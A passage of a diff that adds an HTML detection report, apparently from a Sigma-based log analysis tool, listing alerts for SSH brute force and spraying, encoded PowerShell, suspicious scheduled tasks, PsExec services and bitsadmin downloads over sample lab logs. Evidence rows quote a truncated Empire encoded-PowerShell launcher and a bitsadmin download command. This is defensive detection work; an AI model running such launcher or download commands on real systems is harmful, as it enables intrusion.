+<tr><td class="time">2024-03-10 09:06:10Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:10</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40054 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:17Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:11</td><td class="event">Failed password for invalid user test from 203.0.113.45 port 40062 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:24Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:12</td><td class="event">Failed password for root from 203.0.113.45 port 40070 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:31Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:13</td><td class="event">Failed password for opsadmin from 203.0.113.45 port 40078 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:38Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:14</td><td class="event">Failed password for opsadmin from 203.0.113.45 port 40086 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:07:05Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:18</td><td class="event">Accepted password for opsadmin from 203.0.113.45 port 40188 ssh2</td></tr>
+</tbody></table></div>
+<p class="muted">1 event(s) between the first 9 and the last one are not shown.</p></div>
+</details>
+<details class="alert" id="alert-11" open>
+<summary><span class="level level-high">high</span>
+<span class="title">SSH Login After Brute Force</span>
+<span class="muted">2024-06-03 08:00:00Z &middot; web01 &middot; 11 event(s)</span></summary>
+<div class="body">
+<p>A successful SSH login from an address whose SSH brute force alert fired in the previous 10 minutes. The attacker has most likely guessed a valid password.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-03 08:00:00Z to 2024-06-03 08:10:00Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.77</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1078/003">T1078.003</a> Valid Accounts: Local Accounts; <a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Initial Access, Persistence, Privilege Escalation, Stealth, Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Login After Brute Force <code>156d0b6d-aea1-479c-91ce-eaf6c08cfa67</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A legitimate user who retried many times before remembering the password; A login from an address shared with a host that retries a stale password (NAT gateway, jump host, backup server)</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-03 08:00:00Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:1</td><td class="event">Failed password for root from 203.0.113.77 port 41000 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:00:33Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:2</td><td class="event">Failed password for root from 203.0.113.77 port 41001 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:01:06Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:3</td><td class="event">Failed password for root from 203.0.113.77 port 41002 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:01:39Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:4</td><td class="event">Failed password for root from 203.0.113.77 port 41003 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:02:12Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:5</td><td class="event">Failed password for root from 203.0.113.77 port 41004 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:02:45Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:6</td><td class="event">Failed password for root from 203.0.113.77 port 41005 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:03:18Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:7</td><td class="event">Failed password for root from 203.0.113.77 port 41006 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:03:51Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:8</td><td class="event">Failed password for root from 203.0.113.77 port 41007 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:04:24Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:9</td><td class="event">Failed password for root from 203.0.113.77 port 41008 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:10:00Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:20</td><td class="event">Accepted password for root from 203.0.113.77 port 41100 ssh2</td></tr>
+</tbody></table></div>
+<p class="muted">1 event(s) between the first 9 and the last one are not shown.</p></div>
+</details>
+<details class="alert" id="alert-12" open>
+<summary><span class="level level-high">high</span>
+<span class="title">SSH Login After Brute Force</span>
+<span class="muted">2024-06-04 08:05:00Z &middot; deb13 &middot; 11 event(s)</span></summary>
+<div class="body">
+<p>A successful SSH login from an address whose SSH brute force alert fired in the previous 10 minutes. The attacker has most likely guessed a valid password.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-04 08:05:00Z to 2024-06-04 08:05:30Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.90</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1078/003">T1078.003</a> Valid Accounts: Local Accounts; <a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Initial Access, Persistence, Privilege Escalation, Stealth, Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Login After Brute Force <code>156d0b6d-aea1-479c-91ce-eaf6c08cfa67</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A legitimate user who retried many times before remembering the password; A login from an address shared with a host that retries a stale password (NAT gateway, jump host, backup server)</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-04 08:05:00Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:3</td><td class="event">Failed password for root from 203.0.113.90 port 51000 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:02Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:4</td><td class="event">Failed password for root from 203.0.113.90 port 51001 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:04Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:5</td><td class="event">Failed password for root from 203.0.113.90 port 51002 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:06Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:6</td><td class="event">Failed password for root from 203.0.113.90 port 51003 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:08Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:7</td><td class="event">Failed password for root from 203.0.113.90 port 51004 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:10Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:8</td><td class="event">Failed password for root from 203.0.113.90 port 51005 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:12Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:9</td><td class="event">Failed password for root from 203.0.113.90 port 51006 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:14Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:10</td><td class="event">Failed password for root from 203.0.113.90 port 51007 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:16Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:11</td><td class="event">Failed password for root from 203.0.113.90 port 51008 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:30Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:13</td><td class="event">Accepted password for root from 203.0.113.90 port 51100 ssh2</td></tr>
+</tbody></table></div>
+<p class="muted">1 event(s) between the first 9 and the last one are not shown.</p></div>
+</details>
+<details class="alert" id="alert-13">
+<summary><span class="level level-medium">medium</span>
+<span class="title">PowerShell Encoded Command Execution</span>
+<span class="muted">2020-09-20 06:57:49Z &middot; WORKSTATION6.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects PowerShell (powershell.exe or pwsh.exe, or a renamed copy when Sysmon records its OriginalFileName) started with -EncodedCommand or one of its abbreviations such as -e, -enc or -ec. Attackers pass Base64 encoded scripts this way to hide the real command from analysts and command-line signatures (Empire and Metasploit launchers, Emotet droppers...).</p>
+<dl>
+  <dt>When</dt><dd>2020-09-20 06:57:49Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1027/010">T1027.010</a> Obfuscated Files or Information: Command Obfuscation; <a href="https://attack.mitre.org/techniques/T1059/001">T1059.001</a> Command and Scripting Interpreter: PowerShell <span class="muted">(Execution, Stealth)</span></dd>
+  <dt>Rule</dt><dd>PowerShell Encoded Command Execution <code>6a55e742-68fb-4b56-8a9d-3364684fe986</code></dd>
+  <dt>Author</dt><dd>frack113 (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Management and deployment agents that pass scripts as encoded commands (SCCM, Intune, RMM tools, some installers); A -Command script or -File script arguments containing a standalone -e, -en or -ec, or /e, /en or /ec (for example robocopy /E or xcopy /E run through powershell -Command)</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-20 06:57:49Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td class="nowrap">empire_smbexec_dcerpc_smb_svcctl_excerpt.json:5</td><td class="event">CommandLine=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAcwBpAG8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAHIAcwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAEUAZgBdAC4AQQBzAHMAZ…</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-14">
+<summary><span class="level level-medium">medium</span>
+<span class="title">PowerShell Encoded Command Execution</span>
+<span class="muted">2020-09-20 06:57:49Z &middot; WORKSTATION6.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects PowerShell (powershell.exe or pwsh.exe, or a renamed copy when Sysmon records its OriginalFileName) started with -EncodedCommand or one of its abbreviations such as -e, -enc or -ec. Attackers pass Base64 encoded scripts this way to hide the real command from analysts and command-line signatures (Empire and Metasploit launchers, Emotet droppers...).</p>
+<dl>
+  <dt>When</dt><dd>2020-09-20 06:57:49Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1027/010">T1027.010</a> Obfuscated Files or Information: Command Obfuscation; <a href="https://attack.mitre.org/techniques/T1059/001">T1059.001</a> Command and Scripting Interpreter: PowerShell <span class="muted">(Execution, Stealth)</span></dd>
+  <dt>Rule</dt><dd>PowerShell Encoded Command Execution <code>6a55e742-68fb-4b56-8a9d-3364684fe986</code></dd>
+  <dt>Author</dt><dd>frack113 (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Management and deployment agents that pass scripts as encoded commands (SCCM, Intune, RMM tools, some installers); A -Command script or -File script arguments containing a standalone -e, -en or -ec, or /e, /en or /ec (for example robocopy /E or xcopy /E run through powershell -Command)</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-20 06:57:49Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td class="nowrap">empire_smbexec_dcerpc_smb_svcctl_excerpt.json:6</td><td class="event">CommandLine=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAcwBpAG8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAHIAcwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAEUAZgBdAC4AQQBzAHMAZ…</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-15">
+<summary><span class="level level-medium">medium</span>
+<span class="title">Suspicious Scheduled Task Created</span>
+<span class="muted">2020-09-21 07:15:47Z &middot; WORKSTATION5.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects the creation of a scheduled task (event 4698) whose action runs a command interpreter, script host or LOLBin (cmd, PowerShell, rundll32, regsvr32, mshta, wscript, cscript...) or a program stored in a user-writable staging folder (Temp, Public, Roaming, Desktop, Downloads, ProgramData...). Attackers register such tasks for persistence, privilege escalation and remote execution (e.g. Impacket atexec, Empire).</p>
+<dl>
+  <dt>When</dt><dd>2020-09-21 07:15:47Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1053/005">T1053.005</a> Scheduled Task/Job: Scheduled Task <span class="muted">(Execution, Persistence, Privilege Escalation)</span></dd>
+  <dt>Rule</dt><dd>Suspicious Scheduled Task Created <code>b2f53816-dce1-4a25-82ba-f9879e134928</code></dd>
+  <dt>Author</dt><dd>Nasreddine Bencherchali (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Administration scripts, deployment tools and GPO-deployed tasks that run cmd.exe or PowerShell (baseline them by TaskName and Author); Software installers or updaters that register a task running from a Temp or ProgramData folder; Windows servicing re-registering built-in tasks whose action is rundll32.exe or cmd.exe</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-21 07:15:47Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">empire_schtasks_creation_standard_user_excerpt.json:1</td><td class="event">TaskName=\MordorSchtask SubjectUserName=pgustavo</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-16">
+<summary><span class="level level-medium">medium</span>
+<span class="title">PsExec-Like Service Installed</span>
+<span class="muted">2020-10-19 03:30:46Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects the installation (System event 7045) of the helper service of PsExec (PSEXESVC) or of a similar remote execution tool (PAExec, RemCom, CSExec). These tools run commands as SYSTEM, locally or on a remote host over SMB; administrators use them, and so do attackers to move laterally.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-19 03:30:46Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1569/002">T1569.002</a> System Services: Service Execution <span class="muted">(Execution)</span></dd>
+  <dt>Rule</dt><dd>PsExec-Like Service Installed <code>4d9d8b96-f9b9-4454-86d2-5dc723e625bb</code></dd>
+  <dt>Author</dt><dd>Thomas Patzke, Nasreddine Bencherchali (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Administrators and IT tools that use PsExec or PAExec for remote maintenance</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-19 03:30:46Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">cmd_psexec_lsa_secrets_dump_service_excerpt.json:2</td><td class="event">ServiceName=PSEXESVC ImagePath=%SystemRoot%\PSEXESVC.exe</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-17">
+<summary><span class="level level-medium">medium</span>
+<span class="title">Windows Logon Brute Force From Single Source</span>
+<span class="muted">2020-10-22 08:29:55Z &middot; WORKSTATION5.theshire.local &middot; 5 event(s)</span></summary>
+<div class="body">
+<p>At least 5 failed Windows logons (wrong password, unknown user name or locked-out account) from the same source within 1 minute, the source being the client IP address and workstation name. Password guessing and password spraying tools produce such bursts, far faster than a person retyping a password.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-22 08:29:55Z to 2020-10-22 08:29:55Z</dd>
+<dt>Grouped by</dt><dd><code>IpAddress = -</code> <code>WorkstationName = WORKSTATION5</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing; <a href="https://attack.mitre.org/techniques/T1110/003">T1110.003</a> Brute Force: Password Spraying <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>Windows Logon Brute Force From Single Source <code>6cf25939-c0a0-43f8-bb43-34d254f459cb</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A service, scheduled task, mapped drive or mobile device retrying an outdated password in a loop; A shared host (terminal server, jump host, NAT gateway) where several users mistype their passwords at the same time</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">purplesharp_ad_playbook_I_excerpt.json:1</td><td class="event">SubjectUserName=pgustavo TargetUserName=lrodriguez IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">purplesharp_ad_playbook_I_excerpt.json:2</td><td class="event">SubjectUserName=pgustavo TargetUserName=pgustavo IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">purplesharp_ad_playbook_I_excerpt.json:3</td><td class="event">SubjectUserName=pgustavo TargetUserName=sysmonsvc IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">purplesharp_ad_playbook_I_excerpt.json:4</td><td class="event">SubjectUserName=pgustavo TargetUserName=sbeavers IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">purplesharp_ad_playbook_I_excerpt.json:5</td><td class="event">SubjectUserName=pgustavo TargetUserName=mscott IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-18">
+<summary><span class="level level-medium">medium</span>
+<span class="title">File Download Via Bitsadmin</span>
+<span class="muted">2020-10-23 06:36:43Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects bitsadmin.exe running a BITS transfer with /transfer, or adding an http(s) URL to a job with /addfile. The download is then performed by the BITS service itself, can survive reboots and blends with Windows Update traffic, which makes bitsadmin a classic way to bring attacker tools onto a host.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-23 06:36:43Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1105">T1105</a> Ingress Tool Transfer; <a href="https://attack.mitre.org/techniques/T1197">T1197</a> BITS Jobs <span class="muted">(Execution, Persistence, Stealth, Command and Control)</span></dd>
+  <dt>Rule</dt><dd>File Download Via Bitsadmin <code>32b87f74-31c8-401e-9efe-288445b0431b</code></dd>
+  <dt>Author</dt><dd>Michael Haag, FPT.EagleEye (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Installers, update agents or administrator scripts that still download files with bitsadmin instead of the BITS PowerShell cmdlets</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-23 06:36:43Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">cmd_bitsadmin_download_psh_script_excerpt.json:1</td><td class="event">CommandLine=bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1 NewProcessName=C:\Windows…</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-19">
+<summary><span class="level level-medium">medium</span>
+<span class="title">File Download Via Bitsadmin</span>
+<span class="muted">2020-10-23 06:36:43Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects bitsadmin.exe running a BITS transfer with /transfer, or adding an http(s) URL to a job with /addfile. The download is then performed by the BITS service itself, can survive reboots and blends with Windows Update traffic, which makes bitsadmin a classic way to bring attacker tools onto a host.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-23 06:36:43Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1105">T1105</a> Ingress Tool Transfer; <a href="https://attack.mitre.org/techniques/T1197">T1197</a> BITS Jobs <span class="muted">(Execution, Persistence, Stealth, Command and Control)</span></dd>
+  <dt>Rule</dt><dd>File Download Via Bitsadmin <code>32b87f74-31c8-401e-9efe-288445b0431b</code></dd>
+  <dt>Author</dt><dd>Michael Haag, FPT.EagleEye (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Installers, update agents or administrator scripts that still download files with bitsadmin instead of the BITS PowerShell cmdlets</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-23 06:36:43Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">cmd_bitsadmin_download_psh_script_excerpt.json:5</td><td class="event">CommandLine=bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1 Image=C:\Windows\System32…</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-20">
+<summary><span class="level level-medium">medium</span>
+<span class="title">Suspicious Scheduled Task Created</span>
+<span class="muted">2020-12-19 07:00:22Z &middot; WORKSTATION6.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects the creation of a scheduled task (event 4698) whose action runs a command interpreter, script host or LOLBin (cmd, PowerShell, rundll32, regsvr32, mshta, wscript, cscript...) or a program stored in a user-writable staging folder (Temp, Public, Roaming, Desktop, Downloads, ProgramData...). Attackers register such tasks for persistence, privilege escalation and remote execution (e.g. Impacket atexec, Empire).</p>
+<dl>
+  <dt>When</dt><dd>2020-12-19 07:00:22Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1053/005">T1053.005</a> Scheduled Task/Job: Scheduled Task <span class="muted">(Execution, Persistence, Privilege Escalation)</span></dd>
+  <dt>Rule</dt><dd>Suspicious Scheduled Task Created <code>b2f53816-dce1-4a25-82ba-f9879e134928</code></dd>
+  <dt>Author</dt><dd>Nasreddine Bencherchali (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Administration scripts, deployment tools and GPO-deployed tasks that run cmd.exe or PowerShell (baseline them by TaskName and Author); Software installers or updaters that register a task running from a Temp or ProgramData folder; Windows servicing re-registering built-in tasks whose action is rundll32.exe or cmd.exe</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-12-19 07:00:22Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td class="nowrap">schtask_create_excerpt.json:1</td><td class="event">TaskName=\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager SubjectUserName=pgustavo</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-21">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-03-10 09:05:42Z &middot; web01 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-03-10 09:05:42Z to 2024-03-10 09:06:45Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.45</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-03-10 09:05:42Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:6</td><td class="event">Failed password for invalid user oracle from 203.0.113.45 port 40022 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:05:49Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:7</td><td class="event">Failed password for root from 203.0.113.45 port 40030 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:05:56Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:8</td><td class="event">Failed password for root from 203.0.113.45 port 40038 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:03Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:9</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40046 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:10Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:10</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40054 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:17Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:11</td><td class="event">Failed password for invalid user test from 203.0.113.45 port 40062 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:24Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:12</td><td class="event">Failed password for root from 203.0.113.45 port 40070 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:31Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:13</td><td class="event">Failed password for opsadmin from 203.0.113.45 port 40078 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:38Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:14</td><td class="event">Failed password for opsadmin from 203.0.113.45 port 40086 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:45Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:15</td><td class="event">Failed password for invalid user ubuntu from 203.0.113.45 port 40094 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-22">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Password Spraying</span>
+<span class="muted">2024-03-10 09:05:42Z &middot; web01 &middot; 8 event(s)</span></summary>
+<div class="body">
+<p>Failed SSH password attempts against at least 5 different user names from the same source address within 10 minutes. Trying many accounts with a few common passwords avoids per-account lockouts.</p>
+<dl>
+  <dt>When</dt><dd>2024-03-10 09:05:42Z to 2024-03-10 09:06:31Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.45</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/003">T1110.003</a> Brute Force: Password Spraying <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Password Spraying <code>a5668195-278b-4b24-aaf9-53ee8ff41701</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A shared jump host where several users mistype their passwords in a short time</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-03-10 09:05:42Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:6</td><td class="event">Failed password for invalid user oracle from 203.0.113.45 port 40022 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:05:49Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:7</td><td class="event">Failed password for root from 203.0.113.45 port 40030 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:05:56Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:8</td><td class="event">Failed password for root from 203.0.113.45 port 40038 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:03Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:9</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40046 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:10Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:10</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40054 ssh2</td></tr>
